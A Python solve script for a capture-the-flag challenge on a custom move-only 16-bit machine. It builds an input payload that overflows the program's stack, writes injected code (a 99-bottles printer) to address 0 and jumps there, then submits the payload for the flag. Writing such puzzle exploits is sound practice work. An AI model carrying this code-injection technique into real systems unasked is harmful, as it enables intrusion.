import requests
import json
from base64 import b64encode, b64decode
from pprint import pprint

URL = "https://mov16.cloud"

my_cookie = {
    "name":'access_token',
    "value":'...',
}

s = requests.session()
s.cookies.set(**my_cookie)

def build(contents):
    data = json.dumps({"source": contents})
    r = s.post(URL + "/build", data=data)
    r = json.loads(r.content)

    if 'error' in r:
        raise Exception(f"Build failed: {r['error']}")
    return b64decode(r['binary'])

def submit(contents):
    # j = json.dumps({"binary": b64encode(contents).decode()})
    j = json.dumps({"input": b64encode(contents).decode()})
    r = s.post(URL + "/challenge/pushwagner", data=j, timeout=60)
    assert r.status_code == 200, r.text
    return json.loads(r.content)


def run(binary, input=""):
    # data = json.dumps({"binary": b64encode(binary).decode(), "input": {'13': b64encode(input).decode()}})
    data = json.dumps({"input": {'13': b64encode(input).decode()}})
    res = s.post(URL + "/run", data=data)
    res = json.loads(res.content)

    return res

def show_run(data, metrics=False, debug=True):
    del data['configuration']

    if metrics:
        print("== METRICS ==")
        for name, val in data["metrics"].items():
            print(f"{name}: {val}")
    del data['metrics']

    print("== STATE ==")
    for name, val in data["state"].items():
        print(f"{name}: {val:8} {val:8x}")
    del data['state']

    print("== OUTPUT ==")
    output = data["output"]
    if output:
        for id, content in output.items():
            if len(output) > 1:
                print(f"== OUTPUT MODULE {id} ==")

            decoded = b64decode(content)
            if b"PNG" in decoded:
                print(f"<Saved to {id}.png>")
                with open(f"{id}.png", "wb") as f:
                    f.write(decoded)
            else:
                decoded = decoded.decode("utf-16be")
                print(decoded)
    del data['output']

    if debug:
        debug_d = data['debug_output']
        if len(debug_d) > 0:
            print("== DEBUG ==")
            print(debug_d)
    del data['debug_output']

    for k, v in data.items():
        print(f"{k} = {v}")


code = """% STD

; 0
read:
    !ICO ? NIP <- #print
    ; 3
	STT <- IDA
    ; 5
	counter <- INC <- counter
    ; 9
	NIP <- #read

; 11 (0xa)
print:
	!counter ? NIP <- #HLT
    ; 14 (0xd)
	PRN <- STT
    ; 16 (0x10)
	counter <- DEC <- counter
    ; 20 (0x14)
	NIP <- #print

; 22 (0x16)
counter:
	0
"""

bin = build(code)
print(bin.hex())

# write a program which will write the given program to addres 0 and then jump there
def payloadify(raw):
    words = [raw[i:i+2] for i in range(0, len(raw), 2)]

    parts = ["% STD"]

    for i, w in enumerate(words):
        upper = w[0]
        lower = w[1]

        chunk = f"""\
; 0x{i:04x}: {upper:02x}{lower:02x}
ALX <- LSH <- LSH <- LSH <- LSH <- LSH <- LSH <- LSH <- LSH <- #${upper:02x}
ALY <- #${lower:02x}
{i} <- SUM
"""

        parts.append(chunk)
    
    parts.append("NIP <- #0")

    output = "\n".join(parts)
    return output
    

test = """% STD

loop:
    ;DBG <- counter

    NIP <- #print_number

    ptr <- #part1
    NIP <- #print

    NIP <- #print_number

    counter <- DEC <- counter


    ptr <- #part2
    NIP <- #print

    NIP <- #print_number

    ptr <- #part3
    NIP <- #print
    

    ALX <- counter
    ALY <- #2
    SGT ? NIP <- #loop


; manually do the last two sentences.
ptr <- #two
NIP <- #print

ptr <- #one
NIP <- #print

NIP <- #HLT

print:
    RES <- PIP
    print_loop:
        PRN <- *ptr
        ptr <- INC <- ptr
        *ptr ? NIP <- #print_loop
    NIP <- RES

print_number:
    RES <- PIP

    DIX <- counter
    DIY <- #10
    d2 <- URE

    DIX <- UQO
    DIY <- #10
    d1 <- URE

    DIX <- UQO
    DIY <- #10
    d0 <- URE

    ;setup
    skipped <- #0

    ; print
    ALX <- #'0'
    ALY <- d0
    !d0 ? NIP <- #skip_first
    PRN <- SUM
    NIP <- #normal_first

    skip_first:
    skipped <- #1
    normal_first:
    ALX <- #'0'
    ALY <- d1
    !skipped ? NIP <- #dont_even_try_to_skip
    !d1 ? NIP <- #skip_second
    dont_even_try_to_skip:
    PRN <- SUM

    skip_second:
    ALX <- #'0'
    ALY <- d2
    PRN <- SUM

    NIP <- RES

counter: 255
ptr: 0

d0: 0
d1: 0
d2: 0

skipped: 0

part1: " bottles of beer on the wall, ", 0
part2: " bottles of beer.", 10, "Take one down, pass it around, ", 0
part3: " bottles of beer on the wall.", 10, 10, 0

two: "2 bottles of beer on the wall, 2 bottles of beer.", 10, "Take one down, pass it around, 1 bottle of beer on the wall.", 10, 10, 0

one: "1 bottle of beer on the wall, 1 bottle of beer.", 10, "Take one down, pass it around, no more bottles of beer on the wall.", 10, 10, 0
"""
test = build(test)[0x20:]
# print(test.hex())

code_pwn = payloadify(test)
# print(code_pwn)

shellcode = build(code_pwn)[0x20:]
# print(shellcode.hex())

# fix word order
shellcode = b"".join([shellcode[i:i+2] for i in range(0, len(shellcode), 2)][::-1])
# print(shellcode.hex())

# bin += bytes.fromhex("3f e0 80 41")
# bin += bytes.fromhex("3f e0 80 42")

# all of these are already reversed word-wise (aabb ccdd -> ccdd aabb)
dbgcnt = bytes.fromhex("00 22 3f f0")
mov = bytes.fromhex("80 ff 00 22")

halt = bytes.fromhex("fF FF 3F FF")

printa = bytes.fromhex("80 41 3f e0")
printb = bytes.fromhex("80 42 3f e0")
printc = bytes.fromhex("80 43 3f e0")
printd = bytes.fromhex("80 44 3f e0")
printnl= bytes.fromhex("80 0a 3f e0")

lshlsh = bytes.fromhex("3FFA 3FFA")

jmp = bytes.fromhex("80 00 3F FF")

# print(bin)

# CODE = printa + printa + printa + dbgcnt + mov + dbgcnt + jmp + halt + printb * 1000 + halt

# PAYLOAD = b"".join([CODE[i:i+4] for i in range(0, len(CODE), 4)][::-1])
PAYLOAD = b""
PAYLOAD += shellcode
PAYLOAD += printnl
PAYLOAD += (0x3ed00//2 - 4096) * lshlsh

out = run(bin, input=PAYLOAD)
# print(b64decode(out['output']['14']))
show_run(out)

r = submit(PAYLOAD)
del r['description']
del r['name']

with open("/tmp/ours", "w") as f:
    f.write(b64decode(r['tests'][0]['actual_output']['14']).decode("utf-16be"))
with open("/tmp/wanted", "w") as f:
    f.write(b64decode(r['tests'][0]['expected_output']['14']).decode("utf-16be"))
del r['tests'][0]['actual_output']['14']
del r['tests'][0]['expected_output']['14']
del r['tests'][0]['input']['13']
a = r['tests'][0]
if r['flag']:
    print(r['flag'])
    exit(0)
print(r)